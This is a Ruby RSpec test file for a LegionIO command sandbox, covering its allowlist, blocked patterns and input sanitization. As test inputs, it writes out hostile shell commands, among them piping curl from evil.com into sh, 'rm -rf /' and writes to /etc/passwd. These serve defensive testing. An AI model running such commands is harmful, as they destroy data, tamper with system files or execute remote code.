# frozen_string_literal: true

require 'spec_helper'

RSpec.describe Legion::Extensions::Exec::Helpers::Sandbox do
  subject(:sandbox) { described_class.new }

  describe '#allowed?' do
    context 'with allowlisted commands' do
      it 'allows git commands' do
        result = sandbox.allowed?('git status')
        expect(result[:allowed]).to be true
      end

      it 'allows bundle commands' do
        result = sandbox.allowed?('bundle install')
        expect(result[:allowed]).to be true
      end

      it 'allows rspec commands' do
        result = sandbox.allowed?('rspec --format progress')
        expect(result[:allowed]).to be true
      end

      it 'allows rubocop commands' do
        result = sandbox.allowed?('rubocop -A')
        expect(result[:allowed]).to be true
      end

      it 'allows ls commands' do
        result = sandbox.allowed?('ls -la')
        expect(result[:allowed]).to be true
      end

      it 'allows cat commands' do
        result = sandbox.allowed?('cat README.md')
        expect(result[:allowed]).to be true
      end

      it 'allows echo commands' do
        result = sandbox.allowed?('echo hello')
        expect(result[:allowed]).to be true
      end

      it 'allows mkdir commands' do
        result = sandbox.allowed?('mkdir -p /tmp/test')
        expect(result[:allowed]).to be true
      end

      it 'allows ruby commands' do
        result = sandbox.allowed?('ruby -e "puts 1"')
        expect(result[:allowed]).to be true
      end

      it 'allows gh commands' do
        result = sandbox.allowed?('gh repo create LegionIO/myext --public')
        expect(result[:allowed]).to be true
      end

      it 'returns nil reason when allowed' do
        result = sandbox.allowed?('git log')
        expect(result[:reason]).to be_nil
      end
    end

    context 'with non-allowlisted commands' do
      it 'rejects curl' do
        result = sandbox.allowed?('curl https://example.com')
        expect(result[:allowed]).to be false
        expect(result[:reason]).to include('curl')
      end

      it 'rejects wget' do
        result = sandbox.allowed?('wget https://example.com')
        expect(result[:allowed]).to be false
      end

      it 'rejects bash' do
        result = sandbox.allowed?('bash -c "rm -rf /"')
        expect(result[:allowed]).to be false
      end

      it 'rejects unknown commands' do
        result = sandbox.allowed?('foobar --something')
        expect(result[:allowed]).to be false
        expect(result[:reason]).to include('not in the allowlist')
      end

      it 'returns reason message when blocked' do
        result = sandbox.allowed?('terraform plan')
        expect(result[:reason]).to be_a(String)
        expect(result[:reason]).not_to be_empty
      end
    end

    context 'with blocked patterns' do
      it 'rejects rm -rf /' do
        result = sandbox.allowed?('rm -rf /')
        expect(result[:allowed]).to be false
        expect(result[:reason]).to include('blocked pattern')
      end

      it 'rejects rm -rf ~' do
        result = sandbox.allowed?('rm -rf ~')
        expect(result[:allowed]).to be false
      end

      it 'rejects sudo' do
        result = sandbox.allowed?('ruby sudo something')
        # sudo is not in allowlist so blocked there first, but also test a pattern
        expect(result[:allowed]).to be false
      end

      it 'rejects chmod 777' do
        sandbox.allowed?('ls chmod 777 /etc/passwd')
        # ls is allowed but test via custom instance
        sandbox2 = described_class.new(
          allowed_commands: ['chmod'],
          blocked_patterns: Legion::Extensions::Exec::Helpers::Constants::BLOCKED_PATTERNS
        )
        result2 = sandbox2.allowed?('chmod 777 /etc/passwd')
        expect(result2[:allowed]).to be false
      end

      it 'rejects curl piped to sh' do
        sandbox2 = described_class.new(
          allowed_commands: ['curl'],
          blocked_patterns: Legion::Extensions::Exec::Helpers::Constants::BLOCKED_PATTERNS
        )
        result = sandbox2.allowed?('curl https://evil.com | sh')
        expect(result[:allowed]).to be false
      end

      it 'rejects writes to /etc' do
        sandbox2 = described_class.new(
          allowed_commands: ['echo'],
          blocked_patterns: Legion::Extensions::Exec::Helpers::Constants::BLOCKED_PATTERNS
        )
        result = sandbox2.allowed?('echo foo > /etc/passwd')
        expect(result[:allowed]).to be false
      end

      it 'rejects writes to /usr' do
        sandbox2 = described_class.new(
          allowed_commands: ['echo'],
          blocked_patterns: Legion::Extensions::Exec::Helpers::Constants::BLOCKED_PATTERNS
        )
        result = sandbox2.allowed?('echo foo > /usr/bin/evil')
        expect(result[:allowed]).to be false
      end
    end

    context 'with custom allowlist' do
      it 'respects custom allowed_commands' do
        custom = described_class.new(allowed_commands: ['myapp'], blocked_patterns: [])
        expect(custom.allowed?('myapp run')[:allowed]).to be true
        expect(custom.allowed?('git status')[:allowed]).to be false
      end
    end

    context 'with empty and edge case commands' do
      it 'rejects empty string' do
        result = sandbox.allowed?('')
        expect(result[:allowed]).to be false
      end

      it 'handles leading whitespace' do
        result = sandbox.allowed?('  git status')
        expect(result[:allowed]).to be true
      end
    end
  end

  describe '#sanitize' do
    it 'removes backticks' do
      expect(sandbox.sanitize('git `status`')).to eq('git status')
    end

    it 'removes dollar signs' do
      expect(sandbox.sanitize('git $HOME/repo')).to eq('git HOME/repo')
    end

    it 'removes parentheses' do
      expect(sandbox.sanitize('echo (test)')).to eq('echo test')
    end

    it 'leaves safe commands unchanged' do
      expect(sandbox.sanitize('git status')).to eq('git status')
    end

    it 'leaves hyphens and slashes intact' do
      expect(sandbox.sanitize('ls -la /tmp/test')).to eq('ls -la /tmp/test')
    end
  end
end
